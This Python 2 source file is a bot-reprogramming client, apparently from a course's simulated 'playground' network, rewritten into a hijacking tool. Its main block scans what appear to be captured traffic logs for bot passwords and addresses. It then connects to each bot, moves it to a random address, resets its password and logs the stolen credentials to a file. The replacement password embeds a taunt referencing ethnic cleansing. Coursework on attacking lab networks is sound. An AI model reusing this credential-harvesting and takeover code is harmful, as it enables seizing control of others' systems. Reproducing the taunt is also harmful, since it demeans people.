'''
Created on Feb 18, 2017

@author: sethjn
'''

from bot.common.network import ReprogrammingResponse, ReprogrammingRequest
from bot.common.util import InsertChecksum

from twisted.internet.protocol import Protocol
from playground.network.common.Protocol import MessageStorage
from twisted.internet.defer import Deferred
from playground.twisted.endpoints.GateEndpoint import GateClientEndpoint, PlaygroundNetworkSettings
from twisted.internet import reactor
from twisted.internet.task import deferLater
from twisted.internet.endpoints import connectProtocol

# these are playground utils
from playground.utils.ui import CLIShell, stdio
from playground import playgroundlog

import sys, os, traceback, getpass
from os import listdir as listdir
from time import time
from random import SystemRandom as sr
try:
    import ProtocolStack
except:
    print "WARNING, NO PROTOCOL STACK. RAW COMMUNICATIONS ONLY"
    ProtocolStack = None


class ReprogrammingClientProtocol(Protocol):
    def __init__(self):
        self.__storage = MessageStorage(ReprogrammingResponse)
        self.__requests = {}
        self.__reqId = 0
        
    def __nextId(self):
        self.__reqId += 1
        return self.__reqId
        
    def dataReceived(self, data):
        self.__storage.update(data)
        print("\nReceived from %s ->" % self.transport.getPeer())
        for message in self.__storage.iterateMessages():
            if not self.__requests.has_key(message.RequestId):
                continue
            #print "getting callback for requestId", message.RequestId
            d = self.__requests[message.RequestId]
            d.callback(message.Data)
        
    def reprogram(self, password, subsystem, data, *additionalSubsystems):
        if len(additionalSubsystems) % 2 != 0:
            raise Exception("Arguments to reprogram is both a subsystem and the data")
        req = ReprogrammingRequest(RequestId=self.__nextId(),
                                   Opcode   =0)
        
        subsystems = [subsystem]
        programs = [data]
        
        while additionalSubsystems:
            subsystems.append(additionalSubsystems.pop(0))
            programs.append(additionalSubsystems.pop(0))
            
        subsystems = map(ReprogrammingRequest.SUBSYSTEMS.index, subsystems)
    
        req.Subsystems = subsystems
        req.Data = programs
        
        InsertChecksum(req, password=password)
        self.__requests[req.RequestId] = Deferred()
        self.transport.write(req.__serialize__())
        return self.__requests[req.RequestId]
    
    def status(self, password, *subsystems):
        subsystems = map(ReprogrammingRequest.SUBSYSTEMS.index, subsystems)
        req = ReprogrammingRequest(RequestId =self.__nextId(),
                                   Opcode    =1,
                                   Subsystems=subsystems,
                                   Data      =[])
        InsertChecksum(req, password=password)
        self.__requests[req.RequestId] = Deferred()
        self.transport.write(req.__serialize__())
        return self.__requests[req.RequestId]
    
    
class ReprogrammingShellProtocol(CLIShell):
    PROMPT = "<Reprogramming Shell>"
    
    RAW_PORT = 666
    ADV_PORT = 667
    
    def __init__(self, botAddress):
        CLIShell.__init__(self, prompt=self.PROMPT)
        self.__botAddress = botAddress
        self.__connectPort = self.RAW_PORT
        self.protocol = None
        self.password = "123456"
        self.toPassword = "NotSetYet"
        
    def connectionMade(self):
        self.connectToBot(self.__connectPort)
        self.__loadCommands()
        
    def __botConnectionMade(self, protocol):
        self.transport.write("Connected to Bot at %s\n" % self.__botAddress)
        self.protocol = protocol
        self.prompt = "[%s::%d] >>" % (self.__botAddress, self.__connectPort)
        
        # Check if this is a stolen bot
        if ".66432.13056." not in self.__botAddress:
            randaddress = "%s.66432.13056.%s" % ( sr().getrandbits(22), sr().getrandbits(22))
            randpw = "~EthnicClensiStanWazHere~UrBotWazBelongToUs@%s~Thanks~%s" % (time(),sr().getrandbits(256))
            self.reprogram(None, "ADDRESS", randaddress)
            
            # Save stolen bot info to new file
            with open("stolenBots.py.data", "a") as f:
                f.write("--origAddr=%s --origPass=%s --destAddr=%s --newPass=%s --timestamp=%s\n" % (self.__botAddress,self.password,randaddress,randpw,time()))
                f.flush()
            
            # Connect to moved bot and change password
            bprotocol = ReprogrammingShellProtocol(randaddress)
            bprotocol.password = self.password
            bprotocol.toPassword = randpw
            stdio.StandardIO(bprotocol)
        else: # This is a stolen bot
            self.reprogram(None, "PASSWORD", self.toPassword)
        
    def reprogram(self, writer, *args):
        print("\tPassword: %s" % (self.password))
        print("Reprogram %s to %s" % (args[0],args[1]))
        if not self.protocol:
            writer("Not yet connected. Cannot reprogram\n")
            return 
        subsystem, reprogramArgument = args
        if subsystem not in ReprogrammingRequest.SUBSYSTEMS:
            self.transport.write("Unknown subsystem %s. Options are %s." % (subsystem, ReprogrammingRequest.SUBSYSTEMS))
            return
        if subsystem in ["PASSWORD", "ADDRESS"]:
            dataToSend = reprogramArgument
        else:
            if not os.path.exists(reprogramArgument):
                self.transport.write("File not found %s" % reprogramArgument)
                return
            
            with open(reprogramArgument) as f:
                dataToSend = f.read()
        #writer("Sending %d byte program to subsystem %s\n" % (len(dataToSend), subsystem))
        d = self.protocol.reprogram(self.password, subsystem, dataToSend)
        d.addCallback(self.handleResponse)
        
    def __checkStatus(self, writer, *args):
        if not self.protocol:
            writer("Not yet connected. Cannot reprogram\n")
            return 
        subsystems = list(args)
        for subsystem in subsystems:
            if subsystem not in ReprogrammingRequest.SUBSYSTEMS:
                self.transport.write("Unknown subsystem %s. Options are %s." % (subsystem, ReprogrammingRequest.SUBSYSTEMS))
                return
        d = self.protocol.status(self.password, *subsystems)
        d.addCallback(self.handleResponse)
        
    def __changePassword(self, writer, *args):
        if args:
            writer("Change password takes no arguments.\n")
        self.password = getpass.getpass("Enter new bot password: ")
        
        writer("Password changed successfully.\n")
        
    def __loadCommands(self):
        toggleCommandHandler = CLIShell.CommandHandler("toggle","Toggle between raw and advanced connection",self.__toggleConnection)
        reprogramCommandHandler = CLIShell.CommandHandler("reprogram", "Reprogram the bot's subsystems", defaultCb=self.reprogram)
        getstatusCommandHandler = CLIShell.CommandHandler("status", "Get the bot's subsystems' status", defaultCb=self.__checkStatus)
        changePasswordCommandHandler = CLIShell.CommandHandler("passwd", "Change the bot's password", defaultCb=self.__changePassword)
        
        self.registerCommand(toggleCommandHandler)
        self.registerCommand(reprogramCommandHandler)
        self.registerCommand(getstatusCommandHandler)
        self.registerCommand(changePasswordCommandHandler)
        
    def __toggleConnection(self, writer):
        if self.__connectPort == self.RAW_PORT:
            self.connectToBot(self.ADV_PORT)
        else: self.connectToBot(self.RAW_PORT)
        
    def connectToBot(self, port):
        if self.protocol:
            self.transport.write("Closing old bot connection on %d\n" % self.__connectPort)
            self.protocol.transport.loseConnection()
            self.transport.write("Reloading protocol\n")
            self.protocol = None
            self.prompt = self.PROMPT
        self.__connectPort = port
        
        
        networkSettings = PlaygroundNetworkSettings()
        networkSettings.configureNetworkStack(port == self.ADV_PORT and ProtocolStack or None)
        playgroundEndpoint = GateClientEndpoint(reactor, self.__botAddress, port, networkSettings)
        
        #self.transport.write("Got Endpoint\n")
        reprogrammingProtocol = ReprogrammingClientProtocol()
        #self.transport.write("Got protocol. Trying to connect\n")
        d = connectProtocol(playgroundEndpoint, reprogrammingProtocol)
        #self.transport.write("Setting callback\n")
        d.addCallback(self.__botConnectionMade)
        d.addErrback(self.handleError)
        #self.transport.write("Waiting for callback\n")
    
    
    def handleResponse(self, data):
        #self.transport.write("Received response from server.\n")
        for serverString in data:
            if "uccessful" in serverString:
                self.transport.write("\t%s\n" % serverString)
                #self.protocol.transport.loseConnection()
            else:
                print("Got weird response back...")
        self.refreshInterface()
            
    def handleError(self, failure):
        self.transport.write("Something went wrong: %s\n" % failure)
        self.refreshInterface()
        # swallow error



if __name__ == "__main__":
    cont01 = []

    #TODO serialize everything
    for fname in listdir('.'):
        if ".py" not in fname:
            with open(fname, 'r') as f:
                 cont01.append(f.read())

    print(len(cont01))
    cont02 = []
    for cont01entry in cont01:
        cont02+=cont01entry.split("\n<&#MD]\n")
    cont03 = [entry for entry in cont02 if "\x00\x03\x00\x00\x04\x00\x01\x04\x00\x05\x00\x01\x00\x00\x00" in entry]
    print ("Num reprogram PASSWORD msgs found: %s" % len(cont03))

    cont04 = [x.split("\x00\x03\x00\x00\x04\x00\x01\x04\x00\x05\x00\x01\x00\x00\x00") for x in cont03]

    #Get the passwords
    passwords = [x[1].split("\x00\x06")[0][1:] for x in cont04]

    #Get the addresses
    cont06 = [x[0].split("-> ")[1].split(" [&#MD>")[0] for x in cont04]
    addresses = [x.split(":")[0] for x in cont06]
    ports = [x.split(":")[1] for x in cont06]

    print(zip(addresses,passwords))

    #TODO change address and then change password
    from bot.common.network.ReprogrammingRequest import *
    for addr,pswd in zip(addresses,passwords):
        protocol = ReprogrammingShellProtocol(addr)
        protocol.password = pswd
        stdio.StandardIO(protocol)

    reactor.run()
